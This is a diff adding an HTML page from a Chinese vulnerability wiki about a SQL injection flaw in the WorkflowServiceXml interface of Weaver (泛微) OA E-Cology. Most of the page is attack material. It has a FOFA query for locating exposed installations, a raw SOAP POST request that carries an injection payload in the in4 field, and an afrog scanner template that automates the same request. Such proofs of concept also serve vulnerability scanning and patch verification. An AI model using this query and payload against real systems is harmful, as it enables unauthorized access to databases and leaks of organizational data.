@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA-E-Cology%E6%8E%A5%E5%8F%A3WorkflowServiceXml%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>泛微OA-E-Cology接口WorkflowServiceXml存在SQL注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u6cdb\u5faeOA-E-Cology\u63a5\u53e3WorkflowServiceXml\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "fofa", url: "#fofa" },
+              {title: "poc", url: "#poc" },
+              {title: "afrog poc", url: "#afrog-poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%B3%9B%E5%BE%AEOA-E-Mobile%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0lang2sql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%B3%9B%E5%BE%AEOA-E-Mobile%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0lang2sql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        泛微OA E Mobile移动管理平台lang2sql任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%B3%9B%E5%BE%AEOA-E-Cology-JqueryFileTree.jsp%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%B3%9B%E5%BE%AEOA-E-Cology-JqueryFileTree.jsp%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        泛微OA E Cology JqueryFileTree.jsp目录遍历漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="oa-e-cologyworkflowservicexmlsql">泛微OA-E-Cology接口WorkflowServiceXml存在SQL注入漏洞<a class="headerlink" href="#oa-e-cologyworkflowservicexmlsql" title="Permanent link">&para;</a></h1>
+<p>泛微OA E Cology 接口/services/WorkflowServiceXml 存在SQL注入漏洞，可获取数据库权限，导致数据泄露。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">app=&quot;泛微-OA（e-cology）&quot;</span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">POST /services/WorkflowServiceXml HTTP/1.1</span>
+<span class="l l-Scalar l-Scalar-Plain">Host</span><span class="p p-Indicator">:</span>
+<span class="nt">User-Agent</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span>
+<span class="nt">Content-Type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">text/xml</span>
+<span class="nt">Accept-Encoding</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">gzip</span>
+<span class="nt">Content-Length</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">487</span>
+
+<span class="l l-Scalar l-Scalar-Plain">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:web=&quot;http://webservices.workflow.weaver&quot;&gt; &lt;soapenv:Header/&gt;</span>
+<span class="w">  </span><span class="l l-Scalar l-Scalar-Plain">&lt;soapenv:Body&gt;</span>
+<span class="w">      </span><span class="l l-Scalar l-Scalar-Plain">&lt;web:getHendledWorkflowRequestList&gt;</span>
+<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">&lt;web:in0&gt;1&lt;/web:in0&gt;</span>
+<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">&lt;web:in1&gt;1&lt;/web:in1&gt;</span>
+<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">&lt;web:in2&gt;1&lt;/web:in2&gt;</span>
+<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">&lt;web:in3&gt;1&lt;/web:in3&gt;</span>
+<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">&lt;web:in4&gt;</span>
+<span class="w">            </span><span class="l l-Scalar l-Scalar-Plain">&lt;web:string&gt;1=1 AND 5615=5615&lt;/web:string&gt;</span>
+<span class="w">        </span><span class="l l-Scalar l-Scalar-Plain">&lt;/web:in4&gt;</span>
+<span class="w">      </span><span class="l l-Scalar l-Scalar-Plain">&lt;/web:getHendledWorkflowRequestList&gt;</span>
+<span class="w">  </span><span class="l l-Scalar l-Scalar-Plain">&lt;/soapenv:Body&gt;</span>
+<span class="l l-Scalar l-Scalar-Plain">&lt;/soapenv:Envelope&gt;</span>
+</code></pre></div>
+<p><img alt="image-20240713144906637" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407131449840.png" /></p>
+<p><img alt="image-20240713144940509" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407131449561.png" /></p>
+<h2 id="afrog-poc">afrog poc<a class="headerlink" href="#afrog-poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nt">id</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">泛微OA-E-Cology接口WorkflowServiceXml存在SQL注入漏洞</span>
+
+<span class="nt">info</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">泛微OA-E-Cology接口WorkflowServiceXml存在SQL注入漏洞</span>
+<span class="w">  </span><span class="nt">author</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">wy876</span>
+<span class="w">  </span><span class="nt">severity</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">high</span>
+<span class="w">  </span><span class="nt">verified</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
+<span class="w">  </span><span class="nt">description</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|-</span>
+<span class="w">    </span><span class="no">泛微OA E Cology 接口/services/WorkflowServiceXml 存在SQL注入漏洞，可获取数据库权限，导致数据泄露。</span>
+<span class="w">    </span><span class="no">Fofa: app=&quot;泛微-OA（e-cology）&quot;</span>
+
+<span class="w">  </span><span class="nt">reference</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">https://github.com/wy876/POC/blob/main/泛微OA-E-Cology接口WorkflowServiceXml存在SQL注入漏洞.md</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">泛微e-cology</span>
+<span class="w">  </span><span class="nt">created</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">2024/07/13</span>
+
+
+<span class="nt">rules</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">r0</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">request</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">method</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">POST</span>
+<span class="w">      </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/services/WorkflowServiceXml</span>
+<span class="w">      </span><span class="nt">headers</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">Content-Type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">text/xml</span>
+<span class="w">      </span><span class="nt">body</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
+<span class="w">        </span><span class="no">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:web=&quot;http://webservices.workflow.weaver&quot;&gt; &lt;soapenv:Header/&gt;</span>
+<span class="w">        </span><span class="no">&lt;soapenv:Body&gt;</span>
+<span class="w">        </span><span class="no">&lt;web:getHendledWorkflowRequestList&gt;</span>
+<span class="w">        </span><span class="no">&lt;web:in0&gt;1&lt;/web:in0&gt;</span>
+<span class="w">        </span><span class="no">&lt;web:in1&gt;1&lt;/web:in1&gt;</span>
+<span class="w">        </span><span class="no">&lt;web:in2&gt;1&lt;/web:in2&gt;</span>
+<span class="w">        </span><span class="no">&lt;web:in3&gt;1&lt;/web:in3&gt;</span>
+<span class="w">        </span><span class="no">&lt;web:in4&gt;</span>
+<span class="w">            </span><span class="no">&lt;web:string&gt;1=1 AND 5615=5615&lt;/web:string&gt;</span>
+<span class="w">        </span><span class="no">&lt;/web:in4&gt;</span>
+<span class="w">        </span><span class="no">&lt;/web:getHendledWorkflowRequestList&gt;</span>
+<span class="w">        </span><span class="no">&lt;/soapenv:Body&gt;</span>
+<span class="w">        </span><span class="no">&lt;/soapenv:Envelope&gt;</span>
+<span class="w">    </span><span class="nt">expression</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">response.status == 200 &amp;&amp; response.body.bcontains(b&#39;WorkflowRequestInfo&#39;) &amp;&amp; response.body.bcontains(b&#39;workflowName&#39;) &amp;&amp; response.body.bcontains(b&#39;lastOperatorName&#39;)</span>
+
+<span class="nt">expression</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">r0()</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%B3%9B%E5%BE%AEOA-E-Mobile%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0lang2sql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%B3%9B%E5%BE%AEOA-E-Mobile%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0lang2sql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        泛微OA E Mobile移动管理平台lang2sql任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%B3%9B%E5%BE%AEOA-E-Cology-JqueryFileTree.jsp%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%B3%9B%E5%BE%AEOA-E-Cology-JqueryFileTree.jsp%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        泛微OA E Cology JqueryFileTree.jsp目录遍历漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
